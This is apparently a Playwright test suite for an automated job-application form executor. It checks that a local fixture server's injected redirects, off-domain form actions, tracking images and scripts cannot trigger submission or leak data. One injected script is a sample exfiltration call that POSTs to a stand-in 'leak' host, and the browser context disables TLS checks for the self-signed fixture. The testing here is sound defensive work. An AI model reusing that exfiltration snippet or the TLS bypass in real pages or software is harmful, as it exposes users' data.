import assert from "node:assert/strict";
import { chromium } from "playwright";
import { createServer } from "node:https";
import { mkdtemp, readFile, rm, mkdir, writeFile } from "node:fs/promises";
import { execFileSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { executorFixture } from "../src/executor-fixture.ts";
import { inspectBrowser, runBrowser } from "../src/executor-browser.ts";
import { hash } from "../src/security.ts";
import { EXECUTOR_FIXTURE_DOCUMENT } from "../src/executor-contract.ts";

const temp = await mkdtemp(join(tmpdir(), "owned-executor-ats-"));
execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", join(temp, "key.pem"), "-out", join(temp, "cert.pem"), "-days", "1", "-subj", "/CN=localhost"], { stdio: "ignore" });
let mode = "normal", writes = 0;
const server = createServer({ key: await readFile(join(temp, "key.pem")), cert: await readFile(join(temp, "cert.pem")) }, async (req, res) => {
  try {
    if (mode === "redirect" && req.method === "GET") { res.writeHead(302, { Location: "/changed-destination" }); res.end(); return; }
    if (req.method === "POST") writes++;
    const chunks = []; let size = 0;
    for await (const chunk of req) { size += chunk.length; if (size > 100000) throw Error("oversize"); chunks.push(chunk); }
    const request = new Request(`https://localhost:${server.address().port}${req.url}`, { method: req.method, headers: req.headers, ...(req.method === "POST" ? { body: Buffer.concat(chunks) } : {}) });
    const response = await executorFixture(request);
    let body = await response.text();
    if (req.method === "GET") {
      if (mode === "question") body = body.replace("<button", '<label>Work authorization<select name="authorization"><option>Unknown</option></select></label><button');
      if (mode === "legal") body = body.replace("<button", '<p>By submitting I certify these statements and agree to terms of service.</p><button');
      if (mode === "changed") body = body.replace("Name<input", "Changed question<input");
      if (mode === "offdomain") body = body.replace('<form method="post"', '<form action="https://unapproved.example.invalid/upload" method="post"');
      if (mode === "egress") body = body.replace("</body>", '<img src="https://unapproved.example.invalid/leak"></body>');
      if (mode === "script") body = body.replace("</body>", '<script>fetch("https://unapproved.example.invalid/leak",{method:"POST",body:"must never execute"})</script></body>');
    }
    if (req.method === "POST" && mode === "uncertain") body = "No verifiable confirmation";
    res.writeHead(response.status, Object.fromEntries(response.headers)); res.end(body);
  } catch { res.writeHead(500); res.end(); }
});
await new Promise(resolve => server.listen(0, "127.0.0.1", resolve));
const origin = `https://localhost:${server.address().port}`;
const destination = `${origin}/job-search/workspace/executor-fixture`;
const browser = await chromium.launch({ headless: true });
const context = () => browser.newContext({ javaScriptEnabled: false, serviceWorkers: "block", acceptDownloads: false, ignoreHTTPSErrors: true }); // Self-signed local fixture only; production never ignores TLS.
const results = [];
try {
  let c = await context();
  const form = await inspectBrowser(c, destination); await c.close();
  const content = EXECUTOR_FIXTURE_DOCUMENT;
  const payload = { fields: [{ name: "name", value: "Fictional Candidate" }, { name: "email", value: "fixture@example.invalid" }], document: { name: "resume.txt", content, digest: await hash(content) } };
  c = await context(); let committed = 0;
  const result = await runBrowser(c, form, payload, async () => { committed++; return true; }, origin); await c.close();
  assert.equal(result.status, "fixture_verified", JSON.stringify(result)); assert.equal(writes, 1); assert.equal(committed, 1); assert.equal(result.receipt.synthetic, true);
  results.push("Exact native form fill, résumé upload, guarded single network commit and server-issued synthetic receipt");
  for (const test of ["question", "legal", "offdomain", "redirect"]) {
    mode = test; c = await context();
    await assert.rejects(inspectBrowser(c, destination)); await c.close();
    assert.equal(writes, 1); results.push(`${test}: stopped before candidate data or submission`);
  }
  mode = "changed"; c = await context();
  assert.equal((await runBrowser(c, form, payload, async () => true, origin)).status, "needs_user"); await c.close(); assert.equal(writes, 1);
  results.push("Changed application fingerprint invalidates approval");
  mode = "normal"; c = await context();
  assert.equal((await runBrowser(c, form, payload, async () => false, origin)).status, "needs_user"); await c.close(); assert.equal(writes, 1);
  results.push("Cancellation/pause at final atomic gate prevents all submission traffic");
  mode = "egress"; c = await context();
  assert.equal((await runBrowser(c, form, payload, async () => true, origin)).status, "needs_user"); await c.close(); assert.equal(writes, 1);
  results.push("Unapproved resource request aborted; no payload disclosure or submission");
  mode = "script"; c = await context();
  assert.equal((await runBrowser(c, form, payload, async () => true, origin)).status, "fixture_verified"); await c.close(); assert.equal(writes, 2);
  results.push("Page scripts cannot execute, autosave, or exfiltrate approved fields");
  mode = "uncertain"; c = await context();
  assert.equal((await runBrowser(c, form, payload, async () => true, origin)).status, "uncertain"); await c.close(); assert.equal(writes, 3);
  results.push("Unverifiable write outcome stays uncertain, never submitted or automatically retried");
  c = await context();
  assert.equal((await runBrowser(c, { ...form, destination: "https://job-boards.greenhouse.io/fourkites/jobs/7982637" }, payload, async () => true, origin)).status, "needs_user"); await c.close();
  results.push("Live employer final-action lock is independent of fixture execution");
  await mkdir("test-results", { recursive: true });
  await writeFile("test-results/executor-browser.json", JSON.stringify({ results, fixtureOnly: true, writes }, null, 2));
  console.log(JSON.stringify({ results, fixtureOnly: true, writes }, null, 2));
} finally { await browser.close(); await new Promise(resolve => server.close(resolve)); await rm(temp, { recursive: true, force: true }); }
